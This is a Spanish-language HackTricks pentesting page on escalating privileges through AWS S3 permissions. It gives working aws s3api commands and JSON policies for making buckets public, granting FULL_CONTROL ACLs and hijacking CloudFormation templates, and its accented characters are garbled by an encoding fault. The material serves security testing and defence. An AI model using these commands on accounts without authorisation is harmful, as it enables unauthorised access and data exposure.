# AWS - Escalada de privilegios en S3

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Un atacante con estos permisos sobre buckets interesantes podr√≠a secuestrar recursos y escalar privilegios.

Por ejemplo, un atacante con estos **permisos sobre un bucket de cloudformation** llamado "cf-templates-nohnwfax6a6i-us-east-1" podr√° secuestrar la implementaci√≥n. El acceso puede ser otorgado con la siguiente pol√≠tica:

```json
{
    "Version":"2012-10-17",
    "Statement":[
        {
            "Effect":"Allow",
            "Action":[
                "s3:PutBucketNotification",
                "s3:GetBucketNotification",
                "s3:PutObject",
                "s3:GetObject"],
            "Resource":[
                "arn:aws:s3:::cf-templates-*\/*",
                "arn:aws:s3:::cf-templates-*"]
        },
        {
            "Effect":"Allow",
            "Action":"s3:ListAllMyBuckets",
            "Resource":"*"
        }]
    }
```

Y el secuestro es posible porque hay una **peque√±a ventana de tiempo desde el momento en que se carga la plantilla** en el bucket hasta el momento en que se **implementa la plantilla**. Un atacante podr√≠a simplemente crear una **funci√≥n lambda** en su cuenta que se **dispare cuando se env√≠a una notificaci√≥n de bucket**, y **secuestra** el **contenido** de ese **bucket**.

![](<../../../.gitbook/assets/image (18) (1) (1).png>)

El m√≥dulo Pacu [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn\_\_resource\_injection) se puede utilizar para automatizar este ataque.\
Para obtener m√°s informaci√≥n, consulte la investigaci√≥n original: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Estos son los permisos para **obtener y cargar objetos en S3**. Varios servicios dentro de AWS (y fuera de √©l) utilizan el almacenamiento S3 para almacenar **archivos de configuraci√≥n**.\
Un atacante con **acceso de lectura** a ellos podr√≠a encontrar **informaci√≥n sensible** en ellos.\
Un atacante con **acceso de escritura** a ellos podr√≠a **modificar los datos para abusar de alg√∫n servicio e intentar escalar privilegios**.\
Estos son algunos ejemplos:

* Si una instancia de EC2 est√° almacenando los **datos de usuario en un bucket de S3**, un atacante podr√≠a modificarlo para **ejecutar c√≥digo arbitrario dentro de la instancia de EC2**.

### `s3:PutBucketPolicy`

Un atacante, que necesita ser **de la misma cuenta**, si no el error `The specified method is not allowed will trigger`, con este permiso podr√° otorgarse a s√≠ mismo m√°s permisos sobre el bucket(s) permiti√©ndole leer, escribir, modificar, eliminar y exponer buckets.

```bash
# Actualizar la pol√≠tica del bucket
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>
## Ejemplo de pol√≠tica JSON
{
  "Id": "Policy1568185116930",
  "Version": "2012-10-17",
  "Statement": [
  {
      "Sid": "Stmt1568184932403",
      "Action": [
        "s3:ListBucket"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::welcome",
      "Principal": "*"
  },
  {
    "Sid": "Stmt1568185007451",
    "Action": [
      "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:s3:::welcome/*",
    "Principal": "*"
  }
  ]
}
```

### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Un atacante podr√≠a abusar de estos permisos para **otorgarse m√°s acceso** sobre buckets espec√≠ficos.\
Tenga en cuenta que el atacante no necesita ser de la misma cuenta. Adem√°s, el acceso de escritura

```bash
# Actualizar el ACL del bucket
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

## Ejemplo de ACL JSON
## Aseg√∫rese de modificar el displayName y el ID del propietario seg√∫n el ACL de objeto que recuper√≥.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Un ACL deber√≠a darle el permiso WRITE_ACP para poder poner un nuevo ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Un atacante podr√≠a abusar de estos permisos para otorgarse m√°s acceso sobre objetos espec√≠ficos dentro de los buckets.

```bash
# Actualizar el ACL del objeto del bucket
aws s3api get-object-acl --bucket <bucekt-name> --key flag 
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

## Ejemplo de ACL JSON
## Aseg√∫rese de modificar el displayName y el ID del propietario seg√∫n el ACL de objeto que recuper√≥.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Un ACL deber√≠a darle el permiso WRITE_ACP para poder poner un nuevo ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Se espera que un atacante con estos privilegios pueda poner un Acl a una versi√≥n espec√≠fica del objeto

```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family